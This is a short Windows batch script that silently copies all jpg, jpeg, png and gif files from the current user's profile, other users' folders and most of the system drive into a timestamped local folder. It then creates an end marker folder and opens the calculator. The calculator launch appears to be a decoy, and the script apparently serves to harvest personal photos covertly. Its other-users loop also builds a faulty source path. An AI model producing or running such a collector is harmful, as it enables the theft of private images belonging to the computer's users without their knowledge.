set dirname=%date%_%time:~0,-3%
set dirname="%dirname::=-%"


for %%f in (jpg jpeg png gif) do    xcopy "%USERPROFILE%\*.%%f" "%dirname%\UserFolder\" /y /q /c

for  /f "delims=" %%d  in (  'dir %USERPROFILE% /b /a:D     ^| findstr /B  /V \.  ') do  for %%f in (jpg jpeg png gif) do  xcopy "%USERPROFILE%\%%~nd\*.%%f" "%dirname%\UserFolder\" /s /y /c /q

for  /f "delims=" %%d  in (  'dir %SystemDrive%\Users\ /b /a:D     ^| findstr /B  /V \. ^| findstr /B  /V  \$  ') do (
  for  %%f in (jpg jpeg png gif) do (
    if   %SystemDrive%\Users\%%d NEQ %USERPROFILE%  xcopy "%SystemDrive%\%%d\*.%%f" "%dirname%\SystemDrive\" /s /y /q /c) )


for %%f in (jpg jpeg png gif) do     xcopy "%SystemDrive%\*.%%f" "%dirname%\SystemDisk\" /y /q /c
  

for  /f "delims=" %%d  in (  'dir %SystemDrive%\ /b /a:D     ^| findstr /B  /V \. ^| findstr /B  /V  \$  ') do (
  for  %%f in (jpg jpeg png gif) do (
    if %SystemDrive%\%%d NEQ %SystemRoot% if %SystemDrive%\%%d NEQ %windir% if %SystemDrive%\%%d NEQ C:\Users  xcopy "%SystemDrive%\%%d\*.%%f" "%dirname%\SystemDrive\" /s /y /q /c) )




set dirname=end_%time:~0,-3%
set dirname="%dirname::=-%"
mkdir "%dirname%"


calc